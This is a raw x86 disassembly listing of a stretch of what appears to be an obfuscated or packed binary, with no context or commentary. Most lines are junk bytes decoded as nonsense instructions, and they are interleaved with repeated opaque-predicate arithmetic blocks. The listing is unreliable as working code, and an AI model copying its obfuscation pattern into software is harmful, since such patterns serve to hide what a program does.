  404205:	mov    esp,0xd4039f37
  40420a:	sbb    al,bh
  40420c:	stc    
  40420d:	xor    al,0x3b
  40420f:	(bad)  
  404210:	pop    esi
  404211:	stc    
  404212:	sti    
  404213:	outs   dx,BYTE PTR ds:[esi]
  404214:	ret    
  404215:	inc    edx
  404216:	or     al,0x5
  404218:	lods   al,BYTE PTR ds:[esi]
  404219:	jmp    0x571c:0x5ebc558
  404220:	mov    ah,0x4f
  404222:	mov    esi,0xc0ca966
  404227:	cmovns edi,eax
  40422a:	xchg   ebx,eax
  40422b:	jb     0x4041fc
  40422d:	push   0xeeb094ff
  404232:	outs   dx,BYTE PTR ds:[esi]
  404233:	add    bh,BYTE PTR [edx]
  404235:	add    DWORD PTR [ecx+0x24],0x57
  404239:	sbb    ebx,eax
  40423b:	mov    edx,0x4ca3363b
  404240:	jecxz  0x40428d
  404242:	stos   DWORD PTR es:[edi],eax
  404243:	(bad)  
  404244:	push   ebx
  404245:	sub    ecx,eax
  404247:	jp     0x404266
  404249:	or     BYTE PTR [ebp+0x33d033aa],dh
  40424f:	clc    
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	mov    cs,WORD PTR [ecx-0x1a]
  404264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x404207
  40426e:	xor    al,0x7e
  404270:	pushf  
  404271:	or     ebx,DWORD PTR [ecx+0x35]
  404274:	outs   dx,BYTE PTR ds:[esi]
  404275:	sti    
  404276:	je     0x4041f8
  404278:	loope  0x4042dd
  40427a:	or     BYTE PTR [esi],ah
  40427c:	jg     0x404207
  40427e:	inc    esi
  40427f:	dec    edx
  404280:	push   ebx
  404281:	and    BYTE PTR [esi-0x37d5c2fb],0xa1
  404288:	sub    BYTE PTR [ebp-0xc],al
  40428b:	leave  
  40428c:	sar    esi,cl
  40428e:	or     DWORD PTR [ecx-0x21],edi
  404291:	fst    DWORD PTR [esi]
  404293:	out    dx,eax
  404294:	dec    esp
  404295:	daa    
  404296:	fsubr  QWORD PTR [esp+edi*8-0x2980372b]
  40429d:	(bad)  
  40429e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429f:	in     al,dx
  4042a0:	mov    eax,ds:0x4d4c2443
  4042a5:	gs add ebx,esp
  4042a8:	popa   
  4042a9:	cdq    
  4042aa:	(bad)  
  4042ab:	loop   0x4042de
  4042ad:	ds pop eax
  4042af:	jnp    0x404235
  4042b1:	test   ecx,edx
  4042b3:	push   esp
  4042b4:	(bad)  
  4042b5:	std    
  4042b6:	adc    BYTE PTR [eax],al
  4042b8:	xlat   BYTE PTR ds:[ebx]
  4042b9:	ins    DWORD PTR es:[edi],dx
  4042ba:	faddp  st(4),st
  4042bc:	pop    esp
  4042bd:	fcmovu st,st(1)
  4042bf:	xor    eax,0x2fa06711
  4042c4:	fs jge 0x404263
  4042c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042c8:	push   ds
  4042c9:	add    ah,BYTE PTR [edi]
  4042cb:	mov    ah,0xb8
  4042cd:	xchg   ebx,eax
  4042ce:	ja     0x404335
  4042d0:	jmp    0xa492:0x3fa32aa8
  4042d7:	and    al,0x52
  4042d9:	pop    es
  4042da:	std    
  4042db:	or     ecx,DWORD PTR [edi-0x1b]
  4042de:	mov    DWORD PTR [esi-0x7a0d698],edi
  4042e4:	dec    edi
  4042e5:	and    DWORD PTR [edi-0x1cf32dc1],ecx
  4042eb:	and    al,0x4e
  4042ed:	lods   eax,DWORD PTR ds:[esi]
  4042ee:	mov    eax,0xc92b3b5c
  4042f3:	pop    edi
  4042f4:	das    
  4042f5:	out    dx,eax
  4042f6:	add    ah,ah
  4042f8:	xor    al,0x48
  4042fa:	out    dx,al
  4042fb:	dec    ebx
  4042fc:	or     edi,ebx
  4042fe:	(bad)  
  4042ff:	in     al,0x88
  404301:	xchg   ebx,eax
  404302:	imul   esi,DWORD PTR [eax],0xffffffa8
  404305:	jecxz  0x4042e5
  404307:	adc    bh,al
  404309:	(bad)  
  40430a:	sar    ah,cl
  40430c:	jbe    0x4042f3
  40430e:	shr    DWORD PTR [edi],1
  404310:	and    ebx,DWORD PTR [ebp+0x28]
  404313:	fistp  QWORD PTR [esi+0x5f96eab2]
  404319:	stc    
  40431a:	not    dh
  40431c:	xchg   edx,eax
  40431d:	or     al,0x87
  40431f:	mov    WORD PTR [ebx+0x9],ss
  404322:	je     0x404360
  404324:	or     ecx,DWORD PTR [ebp-0x3aa7a9c6]
  40432a:	retf   
  40432b:	outs   dx,DWORD PTR ds:[esi]
  40432c:	lock mov al,ds:0x7b7829e4
  404332:	pop    edx
  404333:	pusha  
  404334:	aaa    
  404335:	sub    al,0xd
  404337:	mov    edi,esi
  404339:	mov    bh,0x7d
  40433b:	jb     0x404398
  40433d:	bound  eax,QWORD PTR [ebp+0x4b]
  404340:	jo     0x404307
  404342:	nop
  404343:	xchg   esp,eax
  404344:	in     eax,dx
  404345:	mov    al,ds:0xe7a93392
  40434a:	cld    
  40434b:	ret    0xd88a
  40434e:	pop    ebp
  40434f:	pop    edx
  404350:	push   ebx
  404351:	mov    ebp,0xee4bd474
  404356:	dec    eax
  404357:	in     eax,0x13
  404359:	popf   
  40435a:	and    al,0x5d
  40435c:	mov    dl,0x1a
  40435e:	mov    al,0xe5
  404360:	sbb    ah,BYTE PTR [ebx+0x5a]
  404363:	pushf  
  404364:	(bad)  
  404365:	mov    cl,0x15
  404367:	clc    
  404368:	jnp    0x40430d
  40436a:	test   BYTE PTR [esi-0x44],ah
  40436d:	hlt    
  40436e:	sub    BYTE PTR [edx],cl
  404370:	aam    0x5b
  404372:	jl     0x404358
  404374:	(bad)  
  404375:	icebp  
  404376:	xor    eax,DWORD PTR [eax]
  404378:	call   0xc2a0:0x9adb8ba8
  40437f:	mov    bl,0xb9
  404381:	lods   al,BYTE PTR ds:[esi]
  404382:	push   ecx
  404383:	xor    ebx,ebx
  404385:	imul   ebp,DWORD PTR ds:0x2238bb03,0x7bc00aa
  40438f:	jae    0x4043d8
  404391:	add    edx,esi
  404393:	push   ebx
  404394:	stos   BYTE PTR es:[edi],al
  404395:	js     0x4043aa
  404397:	(bad)
  40439b:	adc    ebp,esp
  40439d:	pop    ecx
  40439e:	jl     0x40434f
  4043a0:	shl    DWORD PTR [esi],cl
  4043a2:	or     eax,0xf2adf92d
  4043a7:	or     esp,esp
  4043a9:	out    0x8a,al
  4043ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ac:	fiadd  DWORD PTR [ecx]
  4043ae:	imul   ecx,esp,0xffffffd7
  4043b1:	mov    BYTE PTR [ebx+eiz*1-0x3e],bl
  4043b5:	cmp    eax,0xaaf9aa3b
  4043ba:	ffreep st(5)
  4043bc:	pushf  
  4043bd:	sub    esi,ebx
  4043bf:	imul   edi,DWORD PTR ds:[esi+esi*1-0x80],0x2d
  4043c5:	loope  0x404353
  4043c7:	cmp    ebp,DWORD PTR [ebp+edi*2+0x3d]
  4043cb:	sbb    ebx,DWORD PTR [edx+0x7822de50]
  4043d1:	data16 lock in al,0xc9
  4043d5:	pushf  
  4043d6:	es jp  0x404404
  4043d9:	lods   eax,DWORD PTR ds:[esi]
  4043da:	daa    
  4043db:	inc    ebx
  4043dc:	dec    ebp
  4043dd:	fs and ch,ch
  4043e0:	rcr    ebp,0xca
  4043e3:	xor    eax,0x1a9f97ff
  4043e8:	inc    esi
  4043e9:	xchg   ebx,eax
  4043ea:	sub    eax,0x2a589d49
  4043ef:	jge    0x404424
  4043f1:	mov    ds:0x580f226b,eax
  4043f6:	ret    0xa19e
  4043f9:	jae    0x4043fe
  4043fb:	stc    
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xde670fdf,al
  40444e:	jb     0x4044ca
  404450:	pop    ss
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404421
  404458:	std    
  404459:	js     0x404443
  40445b:	or     ch,BYTE PTR [edx]
  40445d:	xor    al,0x3d
  40445f:	jecxz  0x404409
  404461:	(bad)  
  404462:	(bad)  
  404463:	loope  0x4044be
  404465:	jge    0x4043ea
  404467:	and    eax,0xe516cbdd
  40446c:	mov    esi,0x10f67981
  404471:	mov    ebp,0x10ff6ddb
  404476:	xlat   BYTE PTR cs:[ebx]
  404478:	out    dx,al
  404479:	mov    BYTE PTR [ebx+ecx*1-0x773702e0],bh
  404480:	(bad)  
  404481:	jo     0x4044c2
  404483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404484:	dec    ebp
  404485:	jge    0x4044c6
  404487:	dec    edi
  404488:	shl    cl,0xc9
  40448b:	cld    
  40448c:	lock shl esi,cl
  40448f:	fimul  WORD PTR [edx]
  404491:	not    DWORD PTR [esi+0x6c]
  404494:	cld    
  404495:	stc    
  404496:	lods   eax,DWORD PTR gs:[si]
  404499:	push   ss
  40449a:	(bad)  
  40449b:	cmp    eax,0xed289878
  4044a0:	mov    ebp,0x7e3daf43
  4044a5:	pop    ecx
  4044a6:	gs je  0x4044f4
  4044a9:	fcmovbe st,st(2)
  4044ab:	pop    esp
  4044ac:	(bad)  
  4044ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ae:	sbb    BYTE PTR [eax+0xe52c782],0x9c
  4044b5:	jmp    FWORD PTR [ebx]
  4044b7:	and    dl,ch
  4044b9:	inc    ebp
  4044ba:	imul   BYTE PTR [edi-0x6bfa8b4]
  4044c0:	je     0x40445f
  4044c2:	push   ecx
  4044c3:	dec    ecx
  4044c4:	mov    cl,0x64
  4044c6:	sub    eax,0x203288a7
  4044cb:	xlat   BYTE PTR ds:[ebx]
  4044cc:	repz push 0x95d686f2
  4044d2:	scas   eax,DWORD PTR es:[edi]
  4044d3:	ins    DWORD PTR es:[edi],dx
  4044d4:	sbb    BYTE PTR [ebx],al
  4044d6:	out    0xd0,eax
  4044d8:	xchg   ebp,eax
  4044d9:	rcr    ah,1
  4044db:	dec    ebp
  4044dc:	mov    ebp,DWORD PTR [ebp+edx*2+0x10]
  4044e0:	mov    ebx,0xa7622490
  4044e5:	mov    ecx,0x1c8ba952
  4044ea:	xchg   ecx,eax
  4044eb:	aas    
  4044ec:	xor    DWORD PTR [ecx],edi
  4044ee:	vandps xmm0,xmm6,XMMWORD PTR [edx+0x3e]
  4044f3:	xchg   BYTE PTR [ebp-0x2e],ch
  4044f6:	push   edx
  4044f7:	call   0x8cb9:0x3e9b1a4f
  4044fe:	mov    esi,0xa3907936
  404503:	push   esp
  404504:	fcom   DWORD PTR [ecx]
  404506:	sbb    ecx,esp
  404508:	pop    ebx
  404509:	adc    al,BYTE PTR [ebx+0x70316a77]
  40450f:	mov    ch,0x1c
  404511:	sbb    al,0x17
  404513:	mov    cl,0x33
  404515:	lods   eax,DWORD PTR ds:[esi]
  404516:	imul   ecx,DWORD PTR [eax-0x6aec8429],0x974ce16c
  404520:	in     al,0x0
  404522:	lods   eax,DWORD PTR ds:[esi]
  404523:	outs   dx,DWORD PTR ds:[esi]
  404524:	mov    BYTE PTR [ebx+0x8],ah
  404527:	xchg   edi,eax
  404528:	mov    esi,0x497e4226
  40452d:	sub    esi,DWORD PTR [ebp+0x4b]
  404530:	push   edx
  404531:	jb     0x40453c
  404533:	xchg   edx,eax
  404534:	aam    0xe3
  404536:	sahf   
  404537:	inc    edi
  404538:	lods   al,BYTE PTR ds:[esi]
  404539:	nop
  40453a:	(bad)  
  40453b:	sub    al,0x41
  40453d:	lock or DWORD PTR [esi+ebp*2-0x461cbbc1],0xffffffbc
  404546:	cmc    
  404547:	inc    ebp
  404548:	push   edi
  404549:	and    bh,BYTE PTR [edx-0x6b9911c6]
  40454f:	pop    esp
  404550:	mov    cl,0x9d
  404552:	fsubr  DWORD PTR [edi]
  404554:	stc    
  404555:	jae    0x4045b8
  404557:	cmp    BYTE PTR ds:[edx],dh
  40455a:	dec    eax
  40455b:	jecxz  0x4044e1
  40455d:	ja     0x40451b
  40455f:	sub    al,BYTE PTR [ebx-0x40583eb6]
  404565:	in     eax,0x94
  404567:	jno    0x40450f
  404569:	sub    BYTE PTR [edi-0x1a],0x81
  40456d:	inc    eax
  40456e:	sahf   
  40456f:	out    dx,eax
  404570:	or     dh,ch
  404572:	daa    
  404573:	loop   0x404561
  404575:	stos   BYTE PTR es:[edi],al
  404576:	add    bh,BYTE PTR [edi+0x61]
  404579:	imul   esp,DWORD PTR [edi+0x4790334d],0x8dd950c4
  404583:	jmp    0xa34c:0xa0a1188f
  40458a:	je     0x404575
  40458c:	pop    esi
  40458d:	push   eax
  40458e:	dec    esp
  40458f:	ja     0x404588
  404591:	adc    eax,0x778041f7
  404596:	xor    ch,BYTE PTR [esi]
  404598:	or     dh,BYTE PTR ds:0xccc2c201
  40459e:	inc    ecx
  40459f:	xor    eax,0x9b2d3872
  4045a4:	popf   
  4045a5:	mov    edx,0x4f9845d8
  4045aa:	ins    DWORD PTR es:[edi],dx
  4045ab:	arpl   ax,si
  4045ad:	cmp    BYTE PTR [ecx],al
  4045af:	inc    ecx
  4045b0:	push   ss
  4045b1:	popa   
  4045b2:	test   al,0x1a
  4045b4:	cli    
  4045b5:	arpl   dx,ax
  4045b7:	adc    edi,DWORD PTR [esi]
  4045b9:	xchg   esp,eax
  4045ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045bb:	outs   dx,BYTE PTR ds:[esi]
  4045bc:	push   edi
  4045bd:	sbb    al,0x6f
  4045bf:	cmc    
  4045c0:	adc    BYTE PTR [edx+0x337e0301],cl
  4045c6:	push   ecx
  4045c7:	sub    BYTE PTR [ecx-0x5aa4c476],bl
  4045cd:	fisttp QWORD PTR [eax]
  4045cf:	adc    BYTE PTR [eax+0x3998cbd9],cl
  4045d5:	add    esp,DWORD PTR [ebx+edx*4-0x16360fa2]
  4045dc:	pop    esi
  4045dd:	pop    edx
  4045de:	jb     0x4045b5
  4045e0:	push   ebp
  4045e1:	adc    dl,BYTE PTR [ebx-0x33aa74b3]
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x445140d0],al
  40466a:	and    BYTE PTR [ebx],dl
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x404605
  404675:	sbb    ah,BYTE PTR [ebp-0x604ba987]
  40467b:	call   0x9a26f69f
  404680:	hlt    
  404681:	imul   edx,DWORD PTR [ecx],0xc1ea824b
  404687:	in     eax,dx
  404688:	jg     0x404708
  40468a:	nop
  40468b:	(bad)  
  40468d:	cld    
  40468e:	xchg   ebp,eax
  40468f:	jg     0x4046f2
  404691:	int    0xce
  404693:	bound  eax,QWORD PTR [ebp+0x5b]
  404696:	std    
  404697:	fs ja  0x4046e1
  40469a:	data16 sti 
  40469c:	int3   
  40469d:	lods   al,BYTE PTR ds:[esi]
  40469e:	fisttp QWORD PTR [edx-0x28]
  4046a2:	xor    eax,0x89324d7d
  4046a7:	call   0x899c:0xabbfe1c3
  4046ae:	sub    eax,0x60bbc6a
  4046b3:	pop    ds
  4046b4:	fnstsw WORD PTR [edx-0x19c7249b]
  4046ba:	stos   BYTE PTR es:[edi],al
  4046bb:	std    
  4046bc:	inc    esp
  4046bd:	mov    cs,ebp
  4046bf:	fsubr  DWORD PTR [edi-0x72]
  4046c2:	and    DWORD PTR [edi+edx*2],edi
  4046c5:	sbb    BYTE PTR [edx-0x32e6fdb5],bh
  4046cb:	mov    ebx,0x33d1c1ad
  4046d0:	mov    esi,0x34461053
  4046d5:	fmul   DWORD PTR [eax]
  4046d7:	inc    ebx
  4046d8:	test   BYTE PTR [edi],ch
  4046da:	daa    
  4046db:	pop    ds
  4046dc:	xchg   ebx,eax
  4046dd:	rcpps  xmm6,XMMWORD PTR [esi-0x5848b1e6]
  4046e4:	imul   BYTE PTR [esi+esi*8-0x3a59c176]
  4046eb:	nop
  4046ec:	and    al,0xdb
  4046ee:	push   ebp
  4046ef:	imul   esp,edx,0xffffffb1
  4046f2:	mov    edx,DWORD PTR [edx]
  4046f4:	(bad)  
  4046f6:	hlt    
  4046f7:	push   0x482b3a65
  4046fc:	lahf   
  4046fd:	xchg   edi,eax
  4046fe:	push   eax
  4046ff:	inc    esp
  404700:	gs dec edi
  404702:	or     ch,dl
  404704:	jno    0x404736
  404706:	or     eax,0x12ab8536
  40470b:	vpsubq ymm1,ymm0,YMMWORD PTR [ecx]
  40470f:	jmp    0x4046ae
  404711:	adc    dh,BYTE PTR [esi-0x56]
  404714:	sar    BYTE PTR [esi],0x5a
  404717:	mov    ds:0xc9486286,eax
  40471c:	push   es
  40471d:	neg    ebp
  40471f:	xchg   esp,eax
  404720:	mov    al,0x35
  404722:	stc    
  404723:	dec    eax
  404724:	sub    DWORD PTR [ebx-0x15de1aa5],0xdabb2e8f
  40472e:	push   ebx
  40472f:	fxch   st(4)
  404731:	push   cs
  404732:	push   edi
  404733:	mov    bl,0xf8
  404735:	dec    ebp
  404736:	inc    ebx
  404737:	stos   BYTE PTR es:[edi],al
  404738:	mov    dl,0xcd
  40473a:	push   cs
  40473b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40473c:	lock pop ecx
  40473e:	ins    BYTE PTR es:[edi],dx
  40473f:	mov    ch,0x3c
  404741:	pop    ebx
  404742:	mov    ebx,0x6bd39a64
  404747:	ret    
  404748:	jb     0x404710
  40474a:	shl    BYTE PTR [edi-0x1],1
  40474d:	add    edi,DWORD PTR [esi+0x23bb3d27]
  404753:	das    
  404754:	pop    ebp
  404755:	jecxz  0x40476c
  404757:	cld    
  404758:	into   
  404759:	sbb    BYTE PTR ds:0xafc9f126,bl
  40475f:	das    
  404760:	and    dh,BYTE PTR [edi+0x2c]
  404763:	lock imul esi,DWORD PTR [eax+0x694bca98],0x69aa677b
  40476e:	stc    
  40476f:	pop    ebp
  404770:	inc    ecx
  404771:	cmp    eax,0x816a3ec1
  404776:	mov    ah,0x35
  404778:	dec    ebx
  404779:	outs   dx,DWORD PTR ds:[esi]
  40477a:	(bad)  
  40477c:	and    al,0xf9
  40477e:	push   0x4cd3f4fe
  404783:	jl     0x40473c
  404785:	mov    eax,0xc946b8ba
  40478a:	fsub   st(1),st
  40478c:	cmp    edi,esi
  40478e:	repz fidiv DWORD PTR [edx]
  404791:	jge    0x40475e
  404793:	sbb    eax,0x198122d8
  404798:	cmp    DWORD PTR [edx],edx
  40479a:	loopne 0x4047e4
  40479c:	in     eax,0xf7
  40479e:	pusha  
  40479f:	aas    
  4047a0:	cmp    eax,0xa1effa42
  4047a5:	mov    dl,0xcc
  4047a7:	pop    esi
  4047a8:	mov    al,ds:0x29d90ada
  4047ad:	shl    BYTE PTR [edx-0x77],cl
  4047b0:	ins    DWORD PTR es:[edi],dx
  4047b1:	addr16 adc eax,0xa8efce16
  4047b7:	into   
  4047b8:	sar    BYTE PTR [ecx+edx*8-0x41],cl
  4047bc:	repnz xchg ecx,eax
  4047be:	adc    BYTE PTR [edx],bl
  4047c0:	ret    
  4047c1:	or     al,0x91
  4047c3:	add    esi,DWORD PTR [eax-0x6a]
  4047c6:	sbb    BYTE PTR [edi-0x51],dl
  4047c9:	push   cs
  4047ca:	unpcklps xmm6,XMMWORD PTR [esi+edi*4]
  4047ce:	lods   al,BYTE PTR ds:[esi]
  4047cf:	(bad)  
  4047d0:	push   0xffffffb9
  4047d2:	sub    al,0x41
  4047d4:	sbb    ebp,edi
  4047d6:	inc    al
  4047d8:	popf   
  4047d9:	and    al,BYTE PTR [edi+edi*1+0x68dcfd72]
  4047e0:	rcr    ebp,0xb3
  4047e3:	(bad)  
  4047e6:	add    DWORD PTR [edx-0xb],esp
  4047e9:	jle    0x404813
  4047eb:	add    bl,bh
  4047ed:	sbb    DWORD PTR [edi+0x66],ebp
  4047f0:	add    DWORD PTR [ecx+0x4e],ebx
  4047f3:	rol    DWORD PTR [esi-0x3c],1
  4047f6:	or     bl,BYTE PTR ds:[edi+0x1b0c5147]
  4047fd:	sub    ecx,ecx
  4047ff:	fld    DWORD PTR [edi]
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx+0x16e2f0ba],0xffcc
  40482a:	pushf  
  40482b:	add    al,0x2b
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404895
  404834:	xor    edi,DWORD PTR [edi+0x63c1d3e6]
  40483a:	sbb    eax,0x6f6c49b4
  40483f:	jb     0x404844
  404841:	sbb    BYTE PTR [ebp+eiz*2-0x51],ah
  404845:	xchg   edx,eax
  404846:	adc    ebx,DWORD PTR [esp+eiz*4+0x5b68eaad]
  40484d:	scas   al,BYTE PTR es:[edi]
  40484e:	xchg   edi,eax
  40484f:	cmp    ecx,DWORD PTR [edi+0x4a4c0550]
  404855:	sahf   
  404856:	lock aad 0xad
  404859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40485a:	or     ah,BYTE PTR [edx]
  40485c:	icebp  
  40485d:	ins    DWORD PTR es:[edi],dx
  40485e:	inc    esi
  40485f:	stos   DWORD PTR es:[edi],eax
  404860:	fmul   DWORD PTR [ecx+0x4f]
  404863:	adc    DWORD PTR [ebx+0x1a],0xdee8f922
  40486a:	test   al,0x4b
  40486c:	and    ecx,edx
  40486e:	jg     0x4048e2
  404870:	lods   al,BYTE PTR ds:[esi]
  404871:	popa   
  404872:	fimul  WORD PTR [eax]
  404874:	sti    
  404875:	ss sti 
  404877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404878:	retf   0xc37
  40487b:	jle    0x404864
  40487d:	xor    edi,DWORD PTR [ecx+edi*8-0xc3c631b]
  404884:	je     0x40480a
  404886:	sar    BYTE PTR [eax+0x5ef45f5e],0xf
  40488d:	gs scas al,BYTE PTR es:[edi]
  40488f:	and    DWORD PTR [esi],edx
  404891:	adc    DWORD PTR [eax-0x42c3b9d4],eax
  404897:	or     esp,eax
  404899:	in     al,0x96
  40489b:	inc    ecx
  40489c:	les    edx,FWORD PTR [esi-0x2f]
  40489f:	ftst   
  4048a1:	pop    eax
  4048a2:	leave  
  4048a3:	jecxz  0x4048cc
  4048a5:	dec    edx
  4048a6:	lea    ebx,[edi-0x428cc291]
  4048ac:	cmp    ah,BYTE PTR [ebp-0x7f4adbba]
  4048b2:	sbb    bl,BYTE PTR [edi]
  4048b4:	inc    ecx
  4048b5:	inc    esi
  4048b6:	push   ds
  4048b7:	ds jmp 0x94fa2ca9
  4048bd:	mov    ch,0x59
  4048bf:	scas   eax,DWORD PTR es:[edi]
  4048c0:	push   edx
  4048c1:	add    BYTE PTR [edx-0x7c313e75],ah
  4048c7:	(bad)  
  4048c8:	sti    
  4048c9:	pop    edi
  4048ca:	retf   0x34fb
  4048cd:	pop    es
  4048ce:	adc    al,0xda
  4048d0:	mov    esp,esi
  4048d2:	jne    0x4048c5
  4048d4:	adc    eax,ebp
  4048d6:	pop    esp
  4048d7:	push   esi
  4048d8:	and    BYTE PTR [ebx-0x1db6a715],dl
  4048de:	call   0xeb308913
  4048e3:	fcom   QWORD PTR [ecx+0x24ea94b6]
  4048e9:	ja     0x404954
  4048eb:	clc    
  4048ec:	cmc    
  4048ed:	dec    edi
  4048ee:	mov    BYTE PTR [edi+0x17],bl
  4048f1:	js     0x40495e
  4048f3:	cs std 
  4048f5:	push   ecx
  4048f6:	mov    DWORD PTR [edx-0x14c41342],esi
  4048fc:	and    bh,BYTE PTR [ebx+0x7]
  4048ff:	fstp   DWORD PTR [eax+0xf14155]
  404905:	inc    edi
  404906:	out    dx,eax
  404907:	mov    esp,0xf990a97c
  40490c:	and    eax,0x594d63c1
  404911:	icebp  
  404912:	sbb    DWORD PTR [ebx-0x6368d21f],edx
  404918:	xor    al,0x2e
  40491a:	pop    edx
  40491b:	in     eax,dx
  40491c:	in     eax,0xc4
  40491e:	mov    ebp,0x8ad8f777
  404923:	mov    DWORD PTR [ecx+ebx*2-0x10],edx
  404927:	ret    0xe11d
  40492a:	or     al,0xc7
  40492c:	inc    ebp
  40492d:	fstp   TBYTE PTR [ebx]
  40492f:	and    esi,DWORD PTR [ebp-0x1]
  404932:	test   eax,0x35ed49b3
  404937:	sbb    ch,BYTE PTR [esi]
  404939:	pop    ebp
  40493a:	std    
  40493b:	fwait
  40493c:	es pop edx
  40493e:	pop    eax
  40493f:	nop
  404940:	cmp    al,0x9e
  404942:	dec    ebp
  404943:	adc    esp,DWORD PTR [esi]
  404945:	cpuid  
  404947:	jge    0x404994
  404949:	mov    eax,0x7bc742dd
  40494e:	imul   BYTE PTR [edx-0x4d]
  404951:	or     dh,BYTE PTR [ecx+0x67bafdfc]
  404957:	in     eax,dx
  404958:	aam    0xe7
  40495a:	hlt    
  40495b:	sar    DWORD PTR [ebp-0x592ac011],0xbb
  404962:	sub    eax,DWORD PTR [ecx+0x52a5f740]
  404968:	ja     0x404944
  40496a:	in     al,dx
  40496b:	jno    0x404907
  40496d:	push   eax
  40496e:	xchg   ebx,eax
  40496f:	mov    bl,0x99
  404971:	add    BYTE PTR [ebp-0x140d244b],ch
  404977:	cmp    BYTE PTR [eax],bh
  404979:	sbb    BYTE PTR [eax+ebp*8+0x11],ah
  40497d:	rol    BYTE PTR [ebp+0x2f858fd6],0x79
  404984:	repz push ds
  404986:	(bad)  
  404987:	mov    eax,0xca16f207
  40498c:	dec    esp
  40498d:	inc    ebx
  40498e:	imul   esi,DWORD PTR [edi],0xf583db0
  404994:	pop    es
  404995:	jg     0x40492c
  404997:	xchg   eax,eax
  404999:	imul   ebx
  40499b:	adc    eax,0x45fc6625
  4049a0:	dec    ecx
  4049a1:	ss dec edi
  4049a3:	xor    ah,BYTE PTR [ebx+0x1f]
  4049a6:	adc    eax,0x755cf1db
  4049ab:	les    edx,FWORD PTR [ecx-0x12]
  4049ae:	pop    esp
  4049af:	aaa    
  4049b0:	push   0x71030fd7
  4049b5:	sbb    DWORD PTR [ecx+0x3f3b9b09],esp
  4049bb:	sub    BYTE PTR [eax+0x33ec89b6],0xd0
  4049c2:	add    edx,DWORD PTR [ebp-0x14]
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    edx,esi
